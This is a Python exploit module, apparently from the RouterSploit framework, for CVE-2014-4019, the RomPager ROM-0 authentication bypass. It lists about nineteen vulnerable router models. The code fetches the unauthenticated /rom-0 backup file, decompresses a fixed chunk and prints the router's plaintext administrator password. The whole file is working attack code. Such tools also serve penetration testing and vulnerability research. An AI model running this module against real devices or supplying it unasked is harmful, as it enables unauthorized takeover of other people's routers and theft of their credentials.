import re
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient
from routersploit.libs.lzs.lzs import LZSDecompress


class Exploit(HTTPClient):
    __info__ = {
        "name": "RomPager ROM-0",
        "description": "Exploits RomPager ROM-0 authentication bypass vulnerability that allows downloading "
                       "rom file and extract password without credentials.",
        "authors": (
            "0BuRner",  # routersploit module
        ),
        "references": (
            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=2014-4019",
            "http://www.osvdb.org/show/osvdb/102668",
            "https://dariusfreamon.wordpress.com/tag/rompager/",
            "http://rootatnasro.wordpress.com/2014/01/11/how-i-saved-your-a-from-the-zynos-rom-0-attack-full-disclosure/",
            "https://antoniovazquezblanco.github.io/docs/advisories/Advisory_RomPagerXSS.pdf",
        ),
        "devices": (
            "AirLive WT-2000ARM (2.11.6.0(RE0.C29)3.7.6.1)",
            "D-Link DSL-2520U (1.08 Hardware Version: B1)",
            "D-Link DSL-2640R",
            "D-Link DSL-2740R (EU_1.13 Hardware Version: A1)",
            "Huawei 520 HG",
            "Huawei 530 TRA",
            "Pentagram Cerberus P 6331-42",
            "TP-Link TD-8816",
            "TP-Link TD-8817 (3.0.1 Build 110402 Rel.02846)",
            "TP-LINK TD-8840T (3.0.0 Build 101208 Rel.36427)",
            "TP-Link TD-W8901G",
            "TP-Link TD-W8951ND",
            "TP-Link TD-W8961ND",
            "ZTE ZXV10 W300 (W300V1.0.0a_ZRD_CO3)",
            "ZTE ZXDSL 831CII (ZXDSL 831CIIV2.2.1a_Z43_MD)",
            "ZynOS",
            "ZyXEL ES-2024",
            "ZyXEL Prestige P-2602HW",
            "ZyXEL Prestige 782R",
        ),
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    def run(self):
        if self.check():
            print_success("Target is vulnerable")

            print_status("Downloading rom-0 file...")
            response = self.http_request(
                method="GET",
                path="/rom-0",
            )

            if response:
                print_status("Extracting password from file...")
                password = self.extract_password(response.content)
                print_success("Router password is: {}".format(password))
        else:
            print_error("Target is not vulnerable")

    @staticmethod
    def extract_password(data):
        fpos = 8568

        # Decompress chunk
        result, window = LZSDecompress(data[fpos:])
        print_status("Decompressed chunk: {0}".format(result))

        # Extract plaintext password
        res = re.findall("([\040-\176]{5,})", result)
        if res:
            return res[0]

        return "<not found>"

    @mute
    def check(self):
        response = self.http_request(
            method="HEAD",
            path="/rom-0"
        )

        if response is not None:
            response = self.http_request(
                method="GET",
                path="/rom-0",
            )

            if response is not None \
                    and response.status_code == 200 \
                    and "<html" not in response.text \
                    and len(response.text) > 500:
                return True

        return False
